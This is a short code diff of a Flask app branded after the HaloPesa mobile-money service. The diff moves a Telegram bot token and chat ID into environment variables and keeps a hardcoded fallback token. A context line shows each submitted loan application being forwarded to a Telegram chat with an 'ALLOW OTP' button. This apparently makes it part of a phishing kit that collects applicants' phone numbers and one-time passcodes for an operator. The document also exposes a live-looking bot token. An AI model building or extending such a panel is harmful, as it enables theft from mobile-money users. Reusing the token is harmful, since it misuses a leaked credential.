@@ -10,11 +10,21 @@ import logging
 app = Flask(__name__)
 app.secret_key = 'halopesa-new-2024'
 
+# ============================================
+# 🔐 Get credentials from environment variables
+# ============================================
+BOT_TOKEN = os.environ.get('BOT_TOKEN')
+CHAT_ID   = os.environ.get('CHAT_ID')
+
+# Fallback – only for local testing (remove when deployed)
+if not BOT_TOKEN:
+    BOT_TOKEN = '8204438021:AAHz1pTtUqIW4OP_Fq-MOAw9fCnhKCWEQkA'  # old token – replace!
+if not CHAT_ID:
+    CHAT_ID = '8589275340'
+
 # Set up logging
 logging.basicConfig(level=logging.INFO)
 
-BOT_TOKEN = '8204438021:AAHz1pTtUqIW4OP_Fq-MOAw9fCnhKCWEQkA'
-CHAT_ID = '8589275340'
 TELEGRAM_API = f'https://api.telegram.org/bot{BOT_TOKEN}'
 
 def init_db():
@@ -117,6 +127,7 @@ def submit_loan():
             send_telegram(msg, {'inline_keyboard': [[{'text': '✅ ALLOW OTP', 'callback_data': f'allow_{app_id}'}]]})
             return jsonify({'success': True, 'app_id': app_id})
 
+        # Check returning user
         c.execute('SELECT total_applications FROM users WHERE phone = ?', (phone,))
         existing = c.fetchone()
         is_returning = existing is not None
